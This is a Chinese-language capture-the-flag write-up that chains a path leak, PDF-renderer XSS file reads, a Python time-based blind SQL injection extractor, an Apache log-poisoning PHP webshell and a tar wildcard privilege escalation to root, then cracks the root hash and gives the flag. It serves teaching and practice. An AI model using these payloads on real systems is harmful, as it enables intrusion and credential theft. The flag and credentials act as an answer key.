# Jojo Website 2

## 题目简述

目标是从普通网站用户一路取得服务器 root 权限，flag 格式为 `N0PS{root password}`。官方未公开源码，但给出了完整利用链证据：

1. PHP session 报错泄露 Web 根目录；
2. 条款 PDF 生成器中的服务端 XSS 读取本地源码；
3. 忘记密码页面的时间盲注恢复管理员凭据；
4. 管理员日志查看功能存在 Apache 日志包含，造成 PHP 代码执行；
5. root 定时任务中的 `tar *` 通配符注入完成提权，再破解 root 的传统 DES 密码哈希。

原材料中的截图主要是终端和网页文字输出，没有不可替代的视觉信息，以下均转写为可复现的文本步骤。

## 解题过程

### 1. 用 PHP session 错误泄露绝对路径

给 session ID 传入非法字符 `/`：

```bash
curl -X POST \
  -H 'Cookie: PHPSESSID=/' \
  'http://TARGET/'
```

`session_start()` 的警告直接回显源码位置：

```text
/var/www/jojo_website/html/index.php
```

这个路径随后用于 PDF 渲染器的本地文件读取。

### 2. 通过 PDF 渲染器读取本地源码

注册流程会把用户名写入条款 PDF。普通 HTML 标签会进入生成链，而 `/` 还是上游 `sed` 命令的分隔符，因此 payload 中的斜杠需要写成 `\/`。把用户名设为：

```html
<p id="injection"><\/p><script>
x=new XMLHttpRequest;
x.onload=function(){
  document.getElementById("injection").innerText=this.responseText
};
x.open(
  "GET",
  "file:\/\/\/var\/www\/jojo_website\/html\/index.php"
);
x.send();
<\/script>
```

PDF 渲染器在服务器上执行 JavaScript。它能够访问 `file://`，并把本地文件正文写入最终 PDF。读取 `index.php` 后可知功能文件位于：

```text
/var/www/jojo_website/html/inc/
```

继续读取 `inc/config.php` 和 `inc/forgot.php`，得到两项关键信息：

```php
// config.php
$mysql_pass = "j0j0_p455w0rdZ";
$mysql_user = "jojodb";
$mysql_host = "mysql";
$mysql_db = "j0j0_db";
```

```php
// forgot.php
$email = $_POST["email"];
$sql = "SELECT id FROM j0j0_users WHERE email = '$email'";
```

配置注释还表明管理员会复用密码。忘记密码页面没有查询结果回显，但字符串直接进入 SQL，可做时间盲注。

### 3. 时间盲注恢复管理员账号

先用延时条件确认注入：

```text
' UNION SELECT SLEEP(10) -- -
```

目标存在请求限速，枚举时每次请求间隔约 0.6 秒，并以约 2 秒的响应差作为布尔 oracle。下面是可复用的核心提取器：

```python
import string
import time

import requests


URL = "http://TARGET/?page=forgot"
DELAY = 2
ALPHABET = string.ascii_letters + string.digits + "@._/$-"
session = requests.Session()


def delayed(condition: str) -> bool:
    payload = f"' OR IF(({condition}),SLEEP({DELAY}),0) -- -"
    time.sleep(0.6)
    started = time.monotonic()
    session.post(URL, data={"email": payload}, timeout=10)
    return time.monotonic() - started > 1.5


def extract_scalar(query: str, maximum: int = 255) -> str:
    length = None
    for candidate in range(1, maximum + 1):
        if delayed(f"LENGTH(({query}))={candidate}"):
            length = candidate
            break
    assert length is not None

    output = []
    for position in range(1, length + 1):
        for character in ALPHABET:
            condition = (
                f"ASCII(SUBSTRING(({query}),{position},1))="
                f"{ord(character)}"
            )
            if delayed(condition):
                output.append(character)
                break
        else:
            raise RuntimeError(f"unknown character at position {position}")
    return "".join(output)


admin_hex = "0x6a306a305f61646d696e313233"  # j0j0_admin123
email = extract_scalar(
    "SELECT email FROM j0j0_users "
    f"WHERE username={admin_hex} LIMIT 1"
)
password_hash = extract_scalar(
    "SELECT BINARY password FROM j0j0_users "
    f"WHERE username={admin_hex} LIMIT 1"
)
print(email)
print(password_hash)
```

先查询 `information_schema` 可确认业务表为 `j0j0_messages`、`j0j0_users`，用户表字段包括 `email`、`password`、`username` 和 `is_admin`。管理员记录最终恢复为：

```text
email: jojo@jojocorp.fun
password: $2y$10$qziMqCs/G2aRcl0nSAbZzuXNXSvuSYgBpg7S.BKh9u2pe5MWnmo6G
```

用 PHP 的 `password_verify` 检查配置中的复用密码：

```php
<?php
var_dump(password_verify(
    "j0j0_p455w0rdZ",
    '$2y$10$qziMqCs/G2aRcl0nSAbZzuXNXSvuSYgBpg7S.BKh9u2pe5MWnmo6G'
));
```

结果为 `true`，因此可用邮箱 `jojo@jojocorp.fun` 和密码 `j0j0_p455w0rdZ` 登录管理员账号。

### 4. Apache 日志包含转为代码执行

管理员日志页面的核心代码为：

```php
if (isset($_POST["log"])) {
    include("/var/log/apache2/jojo_log/access_jojo.log");
}
```

Apache 会记录 `User-Agent`，而 PHP `include` 会解释日志中的 `<?php ... ?>`。先注入一个命令执行片段：

```bash
curl 'http://TARGET/' \
  -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
```

再携带管理员 session 请求日志页，并提交 `log` 参数触发包含：

```bash
curl -b 'PHPSESSID=<admin-session>' \
  'http://TARGET/?page=admin&cmd=id' \
  -d 'log=1'
```

页面回显 `www-data` 身份。将 `cmd` 换成经过 URL 编码的反弹 shell 命令，即可获得 `www-data` 交互 shell。

### 5. 利用 tar 通配符注入提权

`/opt/scripts/save.sh` 由 root 每分钟执行：

```bash
#!/bin/bash

cd /var/www/jojo_website
date > last_backup
tar -cf /root/jojo_backup.tar /var/log/apache2/jojo_log *
```

shell 展开 `*` 后，以 `--` 开头的文件名会被 GNU tar 当作命令行选项。创建 checkpoint 参数和执行脚本：

```bash
cd /var/www/jojo_website
printf '%s\n' \
  'cp /bin/bash /tmp/rootbash' \
  'chmod u+s /tmp/rootbash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

定时任务运行后：

```bash
/tmp/rootbash -p
cat /etc/shadow
```

可读到 root 哈希：

```text
qh9INfE5Y7Ngw
```

它是传统 Unix DES `crypt` 哈希：前两个字符是 salt，总长度为 13。按题面提示，用 `rockyou.txt` 和 `best64.rule` 破解：

```bash
hashcat -m 1500 \
  'qh9INfE5Y7Ngw' \
  rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

恢复 root 密码：

```text
1badjojo
```

所以 flag 为：

```text
N0PS{1badjojo}
```

## 方法总结

- 核心技巧：把路径泄露、服务端 PDF XSS、本地文件读取、时间盲注、日志包含和 tar 通配符注入串成完整的 Web 到 root 利用链。
- 识别信号：错误信息暴露绝对路径；服务端渲染器能够执行脚本并访问 `file://`；SQL 无回显但延时可观测；日志被 `include`；高权限脚本在攻击者可写目录中对 `*` 做未加保护的展开。
- 复用要点：每个阶段都应输出下一阶段所需的确定证据，例如绝对路径、源码位置、管理员凭据和执行身份。长链题中不能把“存在某漏洞”直接等同于“已取得下一权限”，每个 pivot 都需要单独验证。
